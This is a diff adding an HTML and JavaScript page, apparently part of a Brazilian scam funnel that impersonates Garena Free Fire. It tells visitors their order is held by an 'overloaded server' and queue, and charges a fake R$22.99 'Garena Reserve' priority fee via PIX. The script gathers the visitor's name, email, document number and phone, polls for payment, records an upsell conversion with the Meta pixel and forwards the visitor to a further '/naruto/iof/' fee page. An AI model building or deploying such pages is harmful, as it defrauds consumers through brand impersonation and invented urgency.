@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="pt">
+
+<head>
+    <meta charset="UTF-8">
+    <!-- Meta Pixel Code -->
+    <script>
+        !function (f, b, e, v, n, t, s) {
+            if (f.fbq) return; n = f.fbq = function () {
+                n.callMethod ?
+                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+            if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+            n.queue = []; t = b.createElement(e); t.async = !0;
+            t.src = v; s = b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '1059470159233925');
+        fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+            src="https://www.facebook.com/tr?id=1059470159233925&ev=PageView&noscript=1" /></noscript>
+    <!-- End Meta Pixel Code -->
+
+    
+    
+    <script>
+        window.onload = function () {
+            var links = document.getElementsByTagName("a");
+            for (var i = 0, n = links.length; i < n; i++) {
+                if (links[i].href.includes("#")) {
+                    continue;
+                }
+
+                var href =
+                    links[i].href.trim() +
+                    (links[i].href.indexOf("?") > 0 ? "&" : "?") +
+                    document.location.search.replace("?", "").toString();
+                links[i].href = href;
+            }
+        };
+    </script>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Live Oficial®</title>
+    <link rel="stylesheet" href="css/products.css">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/fonts.css">
+    <link rel="stylesheet"
+        href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
+
+    
+</head>
+
+<body>
+
+    <nav class="navbar" style="padding-top: 15px;">
+        <div class="menu-icon" style="padding-left: 3%;">
+            <img src="images/LogoRecFF.png" style="height: 5vh;" alt="Logo Central Vivara">
+        </div>
+
+        <div class="logo-central">
+        </div>
+
+        <div class="menu-icon" style="padding-right: 3%;">
+            <span class="material-symbols-outlined"
+                style="font-size: 30px; padding-right: 10px; color: black">account_circle</span>
+        </div>
+    </nav>
+    <div id="ad1">
+
+        <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Seus pedidos</p>
+
+        <div class="ad1">
+
+            <div style="margin-left: 3%; margin-right: 3%;">
+
+                <button class="styled-button">
+                    <div class="icon-container">
+                        <img src="images/LogoGarenaFF.png" alt="Status de entrega" style="width: 32px; height: 32px;">
+                    </div>
+                    <span class="button-text">
+                        <span class="button-title">#6481749338</span>
+                    </span>
+                </button>
+
+                <div class="entrega-container">
+                    <div class="entrega-header">
+                        Status
+                    </div>
+                    <div class="entrega-content">
+                        <div class="icon-container2">
+                            <span class="material-symbols-outlined">check</span>
+                        </div>
+                        <div class="text-container">
+                            <div class="entrega-title">ID Confirmado com Sucesso</div>
+                        </div>
+                    </div>
+                    <div class="entrega-content">
+                        <div class="icon-container3">
+                            <span class="material-symbols-outlined">warning</span>
+                        </div>
+                        <div class="text-container">
+                            <div class="entrega-title">Servidor Sobrecarregado</div>
+                        </div>
+                    </div>
+                </div>
+
+
+
+                <p style="text-align: center; margin-left: 3%; margin-right: 3%;">Seu ID foi confirmado com sucesso,
+                    porém foi encontrado uma pendência no seu pedido. Clique abaixo para resolver esse problema!</p>
+
+                <div class="button-container" style="padding-bottom: 20px;">
+                    <button class="styled-button2" onclick="showAd2()">
+                        <span class="button-text">
+                            <span class="button-title2">Resolver problema</span>
+                        </span>
+                        <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
+                    </button>
+                </div>
+            </div>
+
+        </div>
+
+
+
+    </div>
+
+
+    <div id="ad2" style="display: none;">
+
+        <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Problemas no pedido</p>
+
+        <div class="ad2" style="padding-top: 15px; padding-bottom: 15px;">
+
+            <div style="padding-top: 2px;"></div>
+
+            <div id="loadingGif" class="loading">
+                <div class="spinner"></div>
+            </div>
+
+
+            <div class="entrega-container hidden" id="text1">
+                <div class="entrega-content">
+                    <div class="icon-container2">
+                        <span class="material-symbols-outlined">settings</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title">Posição na fila para recebimento do Bônus de diamantes: 824 de 1341
+                            jogadores.</div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="loadingGif2" class="loading hidden">
+                <div class="spinner"></div>
+            </div>
+
+            <div id="text2" class="hidden entrega-container" style="margin-top: 15px;">
+                <div class="entrega-content">
+                    <div class="icon-container2" style="background-color: #9D0C21;">
+                        <span class="material-symbols-outlined">warning</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title"> Nosso servidor está sobrecarregado devido à alta latência dos
+                            pedidos.</div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="loadingGif3" class="loading hidden" style="padding-top: 20px;">
+                <div class="spinner"></div>
+            </div>
+
+            <div id="text3" class="hidden entrega-container" style="background-color: #9D0C21; margin-top: 15px;">
+                <div class="entrega-content">
+                    <div class="icon-container2" style="background-color: rgb(255, 255, 255);">
+                        <span class="material-symbols-outlined" style="color: #9D0C21;">priority_high</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title" style="color: white">O seu BÔNUS DE DIAMANTES chegará em sua conta em
+                            até (15 Dias úteis). Caso deseje prioridade na fila e a liberação imediata do pedido, Será
+                            necessário efetuar o pagamento do Garena Reserve uma taxa de prioridade para recebimento do
+                            seu produto.</div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="finalButton" class="button-container hidden" style="padding-top: 15px;">
+                <button id="pay-btn-up02" class="styled-button2">
+                    <span class="button-text">
+                        <span class="button-title2">Garena Reserve (R$ 22,99)</span>
+                    </span>
+                    <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
+                </button>
+            </div>
+
+            <!-- Payment Generation Area (Hidden by default) -->
+            <div id="payment-area"
+                style="display:none; margin-top: 20px; padding: 20px; text-align: center; background: #fff; border-radius: 8px;">
+                <div id="loading" class="loading-spinner" style="display:none;"></div>
+                <p id="loading-text" style="display:none; color: #666;">Gerando PIX...</p>
+
+                <div id="qrcode-wrapper" style="display:none;">
+                    <p style="font-weight:bold; margin-bottom:10px; color:#333;">Escaneie o QR Code abaixo:</p>
+                    <img id="qrcode-img" src="" alt="QR Code PIX"
+                        style="max-width: 200px; display: block; margin: 0 auto 15px; border: 1px solid #ddd; border-radius: 8px;">
+
+                    <p style="margin: 15px 0 5px; font-size:14px; color:#333;">Ou copie o código PIX:</p>
+                    <div style="display: flex; gap: 10px; margin-top: 10px;">
+                        <textarea id="pix-code" readonly onclick="this.select()"
+                            style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px; background: #f9f9f9; font-family: monospace; font-size: 12px; height: 60px; resize: none;"></textarea>
+                    </div>
+                    <button class="styled-button2" style="width:100%; margin-top:10px; justify-content: center;"
+                        onclick="copyPix()">
+                        <span class="button-text"><span class="button-title2">Copiar Código PIX</span></span>
+                    </button>
+                </div>
+            </div>
+
+            <div style="padding-bottom: 2px;"></div>
+
+        </div>
+
+    </div>
+
+    <!-- Success Modal -->
+    <div id="success-modal" class="modal-overlay" style="display: none;">
+        <div class="modal-content">
+            <div class="modal-header">
+                <span class="material-symbols-outlined" style="color: #4CAF50; font-size: 48px;">check_circle</span>
+                <h2>Pagamentos Concluídos!</h2>
+            </div>
+            <div class="modal-body">
+                <p>O Garena Reserve foi ativado com sucesso.</p>
+                <p>Seus diamantes chegaram na sua conta em breve.</p>
+            </div>
+            <div class="modal-footer">
+                <button class="styled-button2" onclick="finishFlow()">
+                    <span class="button-text"><span class="button-title2">Ir para o Início</span></span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <style>
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: #fff;
+            padding: 30px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            font-family: 'GellixMedium', sans-serif;
+        }
+
+        .modal-header h2 {
+            margin: 10px 0 15px;
+            color: #333;
+            font-size: 24px;
+        }
+
+        .modal-body p {
+            color: #666;
+            margin-bottom: 10px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+    </style>
+
+    <script src="js/scripts.js"></script>
+
+    <style>
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #d81a0d;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Toast PIX copiado */
+        #pix-toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(20px);
+            background: #d81a0d;
+            color: #fff;
+            padding: 12px 28px;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: bold;
+            box-shadow: 0 4px 20px rgba(216,26,13,0.4);
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease, transform 0.3s ease;
+            z-index: 99999;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            white-space: nowrap;
+        }
+        #pix-toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+    </style>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const payBtn = document.getElementById('pay-btn-up02');
+            const paymentArea = document.getElementById('payment-area');
+            const loading = document.getElementById('loading');
+            const loadingText = document.getElementById('loading-text');
+            const qrWrapper = document.getElementById('qrcode-wrapper');
+            const qrImg = document.getElementById('qrcode-img');
+            const pixText = document.getElementById('pix-code');
+
+            // 1. Get Params from URL (passed from Upsell 1)
+            const urlParams = new URLSearchParams(window.location.search);
+            const customerData = {
+                customerName: urlParams.get('customerName') || localStorage.getItem('ff_nome') || 'Cliente',
+                customerEmail: urlParams.get('customerEmail') || localStorage.getItem('ff_email') || 'cliente@exemplo.com',
+                customerDocument: urlParams.get('customerDocument') || '',
+                customerPhone: urlParams.get('customerPhone') || localStorage.getItem('ff_telefone') || '11999999999'
+            };
+
+            // --- PERSISTÊNCIA DO PAGAMENTO DO GARENA RESERVE ---
+            const savedPaymentId = localStorage.getItem('upsell2_paymentId');
+            const savedQrCode = localStorage.getItem('upsell2_qrCode');
+            const savedPixCode = localStorage.getItem('upsell2_pixCode');
+
+            if (savedPaymentId && savedQrCode && savedPixCode) {
+                console.log("Found existing upsell 2 payment in progress:", savedPaymentId);
+                
+                // Primeiro verifica o status imediatamente
+                fetch(`api/check-payment-status.php?paymentId=${savedPaymentId}`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data && data.status === 'paid') {
+                            console.log("Existing upsell 2 payment was already paid! Redirecting...");
+                            // Limpa localStorage
+                            try {
+                                localStorage.removeItem('upsell2_paymentId');
+                                localStorage.removeItem('upsell2_qrCode');
+                                localStorage.removeItem('upsell2_pixCode');
+                            } catch (e) {}
+                            window.location.href = '/naruto/iof/' + window.location.search;
+                            return;
+                        }
+                    })
+                    .catch(e => console.error("Error checking saved payment status:", e));
+
+                // Se não estiver pago, mostra os dados salvos
+                if (payBtn) payBtn.style.display = 'none';
+                paymentArea.style.display = 'block';
+                loading.style.display = 'none';
+                loadingText.style.display = 'none';
+                qrWrapper.style.display = 'block';
+                qrImg.src = savedQrCode;
+                pixText.value = savedPixCode;
+
+                startUpsell2Polling(savedPaymentId);
+            }
+
+            // 2. Handle Payment Click
+            if (payBtn) {
+                payBtn.addEventListener('click', async () => {
+                    if (!customerData.customerName) {
+                        customerData.customerName = localStorage.getItem('ff_nome') || 'Cliente';
+                    }
+
+                    // UI Updates
+                    payBtn.style.display = 'none';
+                    paymentArea.style.display = 'block';
+                    loading.style.display = 'block';
+                    loadingText.style.display = 'block';
+
+                    // Prepare Payload
+                    const payload = {
+                        amount: "22.99",
+                        customerName: customerData.customerName,
+                        customerEmail: customerData.customerEmail,
+                        customerDocument: customerData.customerDocument,
+                        customerPhone: customerData.customerPhone
+                    };
+
+                    // Add UTMs to payload
+                    urlParams.forEach((value, key) => {
+                        if (!payload[key] && key !== 'customerName' && key !== 'customerEmail' && key !== 'customerDocument' && key !== 'customerPhone') {
+                            payload[key] = value;
+                        }
+                    });
+
+                    try {
+                        const response = await fetch('api/create-pix-payment.php', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        });
+                        const result = await response.json();
+
+                        loading.style.display = 'none';
+                        loadingText.style.display = 'none';
+
+                        if (result.success) {
+                            // Show QR Code
+                            qrWrapper.style.display = 'block';
+                            qrImg.src = result.qrCode;
+                            pixText.value = result.pixCode;
+
+                            // Salva no localStorage para persistir se recarregar
+                            try {
+                                localStorage.setItem('upsell2_paymentId', result.paymentIntentId);
+                                localStorage.setItem('upsell2_qrCode', result.qrCode);
+                                localStorage.setItem('upsell2_pixCode', result.pixCode);
+                            } catch (e) {
+                                console.error("Failed to save to localStorage:", e);
+                            }
+
+                            // Start Polling
+                            if (result.paymentIntentId) {
+                                startUpsell2Polling(result.paymentIntentId);
+                            }
+                        } else {
+                            alert("Erro na geração do PIX: " + (result.error || "Erro desconhecido"));
+                            payBtn.style.display = 'block';
+                            paymentArea.style.display = 'none';
+                        }
+
+                    } catch (error) {
+                        console.error("Payment error:", error);
+                        alert("Erro de conexão. Tente novamente.");
+                        loading.style.display = 'none';
+                        payBtn.style.display = 'block';
+                        paymentArea.style.display = 'none';
+                    }
+                });
+            }
+
+            // Polling Function
+            function startUpsell2Polling(paymentId) {
+                const interval = setInterval(async () => {
+                    try {
+                        const response = await fetch(`api/check-payment-status.php?paymentId=${paymentId}`);
+                        const data = await response.json();
+
+                        if (data && data.status === 'paid') {
+                            clearInterval(interval);
+                            try {
+                                if (typeof fbq === 'function') {
+                                    fbq('trackCustom', 'Upsell', { value: 22.99, currency: 'BRL', content_name: 'garenareserve' }, { eventID: 'upsell_' + paymentId });
+                                }
+                            } catch(e) {}
+                            try {
+                                localStorage.removeItem('upsell2_paymentId');
+                                localStorage.removeItem('upsell2_qrCode');
+                                localStorage.removeItem('upsell2_pixCode');
+                            } catch (e) {}
+                            setTimeout(() => {
+                                window.location.href = '/naruto/iof/' + window.location.search;
+                            }, 500);
+                        }
+                    } catch (err) {
+                        console.error("Polling error:", err);
+                    }
+                }, 3000);
+            }
+
+            // Finish Flow Function
+            window.finishFlow = function () {
+                try {
+                    localStorage.removeItem('verificationPaid');
+                    localStorage.removeItem('upsell2_paymentId');
+                    localStorage.removeItem('upsell2_qrCode');
+                    localStorage.removeItem('upsell2_pixCode');
+                } catch (e) {}
+                // Preserve UTM parameters when redirecting
+                window.location.href = '/naruto/iof/' + window.location.search;
+            };
+
+            window.copyPix = function () {
+                const copyText = document.getElementById("pix-code");
+                copyText.select();
+                copyText.setSelectionRange(0, 99999);
+                navigator.clipboard.writeText(copyText.value).then(() => {
+                    showPixToast();
+                }).catch(() => {
+                    document.execCommand('copy');
+                    showPixToast();
+                });
+            }
+
+            function showPixToast() {
+                const toast = document.getElementById('pix-toast');
+                toast.classList.add('show');
+                setTimeout(() => toast.classList.remove('show'), 2500);
+            }
+        });
+    </script>
+
+
+
+    <!-- Toast PIX copiado -->
+    <div id="pix-toast">
+        <span>&#10003;</span> PIX copiado!
+    </div>
+
+</body>
+
+</html>
